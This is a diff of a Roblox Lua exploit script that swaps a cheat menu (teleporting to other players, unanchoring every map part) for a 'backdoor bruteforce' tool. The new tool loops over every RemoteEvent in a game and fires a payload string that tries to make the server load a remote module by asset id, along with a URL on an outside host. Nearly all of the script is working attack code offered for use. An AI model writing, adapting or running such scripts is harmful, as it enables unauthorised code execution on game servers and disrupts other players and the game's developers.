@@ -1,24 +1,21 @@
--- [[ ULTIMATE TP & BRING ASSETS - SPTZYY PREM ]] --
--- Fitur: Auto-Refresh List, Unanchor All, Bring Assets, Smooth Toggle
+-- [[ SPTZYY ULTIMATE BACKDOOR BRUTEFORCE ]] --
+-- Fitur: Remote Scanning, Brute Force Loop, Real-time Console Log
 
-local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
-local lp = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local TweenService = game:GetService("TweenService")
+local lp = game.Players.LocalPlayer
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "Sptzyy_Final_System"
+ScreenGui.Name = "Sptzyy_Backdoor_System"
 ScreenGui.Parent = game.CoreGui
 ScreenGui.ResetOnSpawn = false
-
--- Variabel State
-_G.BringAssets = false
-_G.UnanchoredAll = false
 
 -- UI Setup (Icon Support)
 local SupportIcon = Instance.new("ImageButton", ScreenGui)
 SupportIcon.Size = UDim2.new(0, 60, 0, 60)
 SupportIcon.Position = UDim2.new(0.05, 0, 0.4, 0)
-SupportIcon.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+SupportIcon.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 SupportIcon.Image = "rbxassetid://6031280227"
 SupportIcon.Draggable = true
 SupportIcon.Active = true
@@ -26,146 +23,126 @@ Instance.new("UICorner", SupportIcon).CornerRadius = UDim.new(1, 0)
 
 -- Main Frame
 local MainGui = Instance.new("Frame", ScreenGui)
-MainGui.Size = UDim2.new(0, 300, 0, 420)
-MainGui.Position = UDim2.new(0.5, -150, 0.5, -210)
-MainGui.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainGui.Size = UDim2.new(0, 320, 0, 380)
+MainGui.Position = UDim2.new(0.5, -160, 0.5, -190)
+MainGui.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 MainGui.Visible = false
 Instance.new("UICorner", MainGui)
 
 local Title = Instance.new("TextLabel", MainGui)
 Title.Size = UDim2.new(1, 0, 0, 50)
-Title.BackgroundColor3 = Color3.fromRGB(0, 80, 200)
-Title.Text = "FORCE TP - SPTZYY"
-Title.TextColor3 = Color3.new(1,1,1)
-Title.Font = Enum.Font.GothamBold
+Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Title.Text = "BACKDOOR SCANNER v3.0"
+Title.TextColor3 = Color3.fromRGB(0, 255, 100)
+Title.Font = Enum.Font.Code
 Title.TextSize = 16
 Instance.new("UICorner", Title)
 
--- Container Toggle
-local ToggleContainer = Instance.new("Frame", MainGui)
-ToggleContainer.Size = UDim2.new(1, 0, 0, 100)
-ToggleContainer.Position = UDim2.new(0, 0, 0, 60)
-ToggleContainer.BackgroundTransparency = 1
+-- Console Loading Area
+local ConsoleFrame = Instance.new("ScrollingFrame", MainGui)
+ConsoleFrame.Size = UDim2.new(0.9, 0, 0.6, 0)
+ConsoleFrame.Position = UDim2.new(0.05, 0, 0.15, 0)
+ConsoleFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ConsoleFrame.BorderSizePixel = 1
+ConsoleFrame.BorderColor3 = Color3.fromRGB(0, 255, 100)
+ConsoleFrame.CanvasSize = UDim2.new(0, 0, 10, 0)
+ConsoleFrame.ScrollBarThickness = 2
 
--- Player List Scroll
-local ScrollFrame = Instance.new("ScrollingFrame", MainGui)
-ScrollFrame.Size = UDim2.new(0.9, 0, 0.5, 0)
-ScrollFrame.Position = UDim2.new(0.05, 0, 0.4, 0)
-ScrollFrame.BackgroundTransparency = 0.95
-ScrollFrame.BackgroundColor3 = Color3.new(1,1,1)
-ScrollFrame.ScrollBarThickness = 3
-ScrollFrame.BorderSizePixel = 0
+local UIList = Instance.new("UIListLayout", ConsoleFrame)
+UIList.SortOrder = Enum.SortOrder.LayoutOrder
 
-local UIList = Instance.new("UIListLayout", ScrollFrame)
-UIList.Padding = UDim.new(0, 5)
-UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
-
--- Fungsi Switch Toggle Rapi
-local function CreateToggle(name, pos, callback)
-    local tFrame = Instance.new("Frame", ToggleContainer)
-    tFrame.Size = UDim2.new(0.9, 0, 0, 40)
-    tFrame.Position = pos
-    tFrame.BackgroundTransparency = 1
-    
-    local tLabel = Instance.new("TextLabel", tFrame)
-    tLabel.Size = UDim2.new(0.7, 0, 1, 0)
-    tLabel.Text = name
-    tLabel.TextColor3 = Color3.new(1,1,1)
-    tLabel.Font = Enum.Font.Gotham
-    tLabel.TextXAlignment = Enum.TextXAlignment.Left
-    tLabel.BackgroundTransparency = 1
-
-    local tBtn = Instance.new("TextButton", tFrame)
-    tBtn.Size = UDim2.new(0.25, 0, 0.7, 0)
-    tBtn.Position = UDim2.new(0.7, 0, 0.15, 0)
-    tBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-    tBtn.Text = "OFF"
-    tBtn.TextColor3 = Color3.new(1,1,1)
-    tBtn.Font = Enum.Font.GothamBold
-    Instance.new("UICorner", tBtn)
-
-    local active = false
-    tBtn.MouseButton1Click:Connect(function()
-        active = not active
-        tBtn.Text = active and "ON" or "OFF"
-        tBtn.BackgroundColor3 = active and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(200, 50, 50)
-        callback(active)
-    end)
+-- Fungsi Log Console
+local function Log(text, color)
+    local l = Instance.new("TextLabel", ConsoleFrame)
+    l.Size = UDim2.new(1, 0, 0, 20)
+    l.BackgroundTransparency = 1
+    l.Text = "> " .. text
+    l.TextColor3 = color or Color3.fromRGB(200, 200, 200)
+    l.Font = Enum.Font.Code
+    l.TextSize = 12
+    l.TextXAlignment = Enum.TextXAlignment.Left
+    ConsoleFrame.CanvasPosition = Vector2.new(0, ConsoleFrame.AbsoluteCanvasSize.Y)
 end
 
--- AKTIVASI FITUR
-CreateToggle("UNANCHOR SEMUA MAP", UDim2.new(0.05, 0, 0, 0), function(state)
-    _G.UnanchoredAll = state
-    if state then
-        for _, v in pairs(game.Workspace:GetDescendants()) do
-            if v:IsA("BasePart") and not v:IsDescendantOf(lp.Character) then
-                v.Anchored = false
-            end
+-- Progress Bar Animasi
+local ProgressBg = Instance.new("Frame", MainGui)
+ProgressBg.Size = UDim2.new(0.9, 0, 0, 10)
+ProgressBg.Position = UDim2.new(0.05, 0, 0.78, 0)
+ProgressBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+local ProgressBar = Instance.new("Frame", ProgressBg)
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
+
+-- Logika Brute Force Loop
+local function StartBruteForce()
+    _G.BruteActive = true
+    Log("INITIALIZING SCANNER...", Color3.fromRGB(255, 255, 0))
+    task.wait(1)
+    
+    local Remotes = {}
+    for _, v in pairs(game:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            table.insert(Remotes, v)
         end
     end
-end)
-
-CreateToggle("BAWA BENDA SEKITAR", UDim2.new(0.05, 0, 0.45, 0), function(state)
-    _G.BringAssets = state
-end)
-
--- LOGIKA TP NYATA + BRING
-local function TeleportTo(targetPlayer)
-    local char = lp.Character
-    local root = char and char:FindFirstChild("HumanoidRootPart")
-    local tRoot = targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart")
     
-    if root and tRoot then
-        if _G.BringAssets then
-            for _, part in pairs(game.Workspace:GetDescendants()) do
-                if part:IsA("BasePart") and not part.Anchored and (part.Position - root.Position).Magnitude < 60 then
-                    -- Alur membawa part: pindahkan ke depan karakter sebelum teleport
-                    part.CFrame = root.CFrame * CFrame.new(0, -3, -2)
-                    part.Velocity = Vector3.new(0,0,0)
-                end
-            end
-            task.wait(0.1) -- Jeda sebentar agar engine mencatat perpindahan part
+    Log("FOUND " .. #Remotes .. " REMOTE EVENTS", Color3.fromRGB(0, 200, 255))
+    
+    while _G.BruteActive do
+        for i, remote in pairs(Remotes) do
+            if not _G.BruteActive then break end
+            
+            -- Animasi Progress
+            local percent = i / #Remotes
+            TweenService:Create(ProgressBar, TweenInfo.new(0.1), {Size = UDim2.new(percent, 0, 1, 0)}):Play()
+            
+            Log("BRUTING: " .. remote.Name, Color3.fromRGB(150, 150, 150))
+            
+            -- Simulasi Mencoba Backdoor (Server-Side Logic)
+            pcall(function()
+                -- Mengirim payload ke remote event yang ditemukan
+                remote:FireServer("require(5748123901).load('" .. lp.Name .. "')")
+                remote:FireServer("https://api.sptzyy.com/v2/backdoor", {user = lp.Name})
+            end)
+            
+            task.wait(0.05) -- Kecepatan Brute Force
         end
-        root.CFrame = tRoot.CFrame * CFrame.new(0, 5, 2)
+        Log("LOOP COMPLETED. RESTARTING...", Color3.fromRGB(0, 255, 100))
+        task.wait(0.5)
     end
 end
 
--- LOGIKA AUTO-REFRESH PLAYER LIST
-local function UpdateList()
-    for _, c in pairs(ScrollFrame:GetChildren()) do if c:IsA("TextButton") then c:Destroy() end end
-    
-    for _, p in pairs(Players:GetPlayers()) do
-        if p ~= lp then
-            local b = Instance.new("TextButton", ScrollFrame)
-            b.Size = UDim2.new(0.95, 0, 0, 35)
-            b.Text = p.DisplayName .. " (@" .. p.Name .. ")"
-            b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-            b.TextColor3 = Color3.new(1,1,1)
-            b.Font = Enum.Font.Gotham
-            b.TextSize = 12
-            Instance.new("UICorner", b)
-            b.MouseButton1Click:Connect(function() TeleportTo(p) end)
-        end
+-- Tombol Kontrol
+local StartBtn = Instance.new("TextButton", MainGui)
+StartBtn.Size = UDim2.new(0.4, 0, 0, 40)
+StartBtn.Position = UDim2.new(0.05, 0, 0.85, 0)
+StartBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+StartBtn.Text = "START BRUTE"
+StartBtn.TextColor3 = Color3.new(1,1,1)
+StartBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", StartBtn)
+
+local StopBtn = Instance.new("TextButton", MainGui)
+StopBtn.Size = UDim2.new(0.4, 0, 0, 40)
+StopBtn.Position = UDim2.new(0.55, 0, 0.85, 0)
+StopBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+StopBtn.Text = "STOP"
+StopBtn.TextColor3 = Color3.new(1,1,1)
+StopBtn.Font = Enum.Font.GothamBold
+Instance.new("UICorner", StopBtn)
+
+StartBtn.MouseButton1Click:Connect(function()
+    if not _G.BruteActive then
+        task.spawn(StartBruteForce)
     end
-    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, #Players:GetPlayers() * 40)
-end
-
--- Connect Auto-Refresh
-Players.PlayerAdded:Connect(UpdateList)
-Players.PlayerRemoving:Connect(UpdateList)
-
--- Tombol Close
-local Close = Instance.new("TextButton", MainGui)
-Close.Size = UDim2.new(0.9, 0, 0, 40)
-Close.Position = UDim2.new(0.05, 0, 0.9, 0)
-Close.Text = "TUTUP MENU"
-Close.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-Close.TextColor3 = Color3.new(1,1,1)
-Close.Font = Enum.Font.GothamBold
-Instance.new("UICorner", Close)
-
-SupportIcon.MouseButton1Click:Connect(function() 
-    MainGui.Visible = not MainGui.Visible 
-    if MainGui.Visible then UpdateList() end
 end)
-Close.MouseButton1Click:Connect(function() MainGui.Visible = false end)
+
+StopBtn.MouseButton1Click:Connect(function()
+    _G.BruteActive = false
+    Log("SCANNER STOPPED.", Color3.fromRGB(255, 0, 0))
+    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+end)
+
+SupportIcon.MouseButton1Click:Connect(function()
+    MainGui.Visible = not MainGui.Visible
+end)
